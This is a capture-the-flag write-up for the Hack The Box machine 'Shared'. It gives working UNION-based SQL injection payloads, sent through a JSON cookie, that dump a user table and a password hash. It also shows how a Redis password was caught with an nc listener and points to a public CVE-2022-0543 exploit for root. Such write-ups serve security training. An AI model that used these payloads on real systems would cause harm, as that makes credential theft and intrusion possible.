---
title: "HTB - Shared"
date: 2023-03-11T18:44:08+01:00
draft: false
tags: [HTB, Medium, Linux, SQL, SQL_injection, Redis]
---

## Foothold
### Nmap
```
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:  
| 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)  
| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)  
|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)  
80/tcp open http nginx 1.18.0  
|_http-server-header: nginx/1.18.0  
|_http-title: Did not follow redirect to [https://shared.htb/](https://shared.htb/)  
| http-robots.txt: 81 disallowed entries (15 shown)  
| /*?order= /*?tag= /*?id_currency= /*?search_query=  
| /*?back= /*?n= /*&order= /*&tag= /*&id_currency=  a
| /*&search_query= /*&back= /*&n= /*controller=addresses  
|_/*controller=address /*controller=authentication  
443/tcp open ssl/http nginx 1.18.0  
|_ssl-date: TLS randomness does not represent time  
|_http-server-header: nginx/1.18.0  
| tls-nextprotoneg:  
| h2  
|_ http/1.1  
| tls-alpn:  
| h2  
|_ http/1.1  
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US  
| Not valid before: 2022-03-20T13:37:14  
|_Not valid after: 2042-03-15T13:37:14  
|_http-trane-info: Problem with XML parsing of /evox/about  
| http-robots.txt: 81 disallowed entries (15 shown)  
| /*?order= /*?tag= /*?id_currency= /*?search_query=  
| /*?back= /*?n= /*&order= /*&tag= /*&id_currency=  
| /*&search_query= /*&back= /*&n= /*controller=addresses  
|_/*controller=address /*controller=authentication  
| http-title: Shared Shop  
|_Requested resource was [https://shared.htb/index.php](https://shared.htb/index.php)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Basic https website, nothing out of the ordinary on the first sight.

Website uses presta shop, check for vuln. An SQL injection is possible one of the query parameters. However, this is hardly exploitable.

Upon browsing the site and trying to buy some stuff. We are redirected on checkout to another website: `checkout.shared.htb`.

## User
After some digging using burp. We can see that not only the website sets some custom cookies in JSON format but also that the content of the cookie vulnerable to  SQL injection.

We can confirm that by changing the value of the cookie from `{"XHFG":"1"}` to `{"XH" + "FG" : "1"}` and the website still works properly.

From there it's guessing and sqlmap time...
After some time, we can see that the first parameter is UNION vulnerable. We can use it to disclose informations about the db `checkout` using:
```
{"AAAAA' and 0=1 union select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -":"1"}
	> user	
{"AAAAA' and 0=1 union select 1, username, password from checkout.user-- -":"1"}
	> james_mason
{"AAAAA' and 0=1 union select 1, password, username from checkout.user-- -":"1"}
	> fc895d4eddc2fc12f995e18c865cf273
```

## LPE
linPEAS tells us that the file `redis_connector_dev` is unsual, doesn't belong here.
the file is a compiled go executable that connects to a local redis instance on port 6379.

Trying to RE using cutter => No use, to complicated. There has to be a simpler way.
Lets try to emulate a redis db by listening to 6379 on localhost and run the app.

```
> nc -lnvp 6379
> ./redis_connector_dev # from another shell

listening on [any] 6379 ...  
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42250  
*2  
$4  
auth  
$16  
F2WHqJUz2WEz=Gqq
```
Cool, we get the redis password. 

A simple check with `ps -ef |grep redis` can show us that redis is run as root. Let's try to abuse it.
> Thx hacktriks 
> https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

One cool trick that might work would be the [LUA sanbox bypass](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass), as it is the CVE-2022-0543 and the version of Redis (6.0.15) is vulnerable. 

Using this wonderful tool: https://github.com/aodsec/CVE-2022-0543 we get an easy root !

AAAAAAAAAAAAAAAA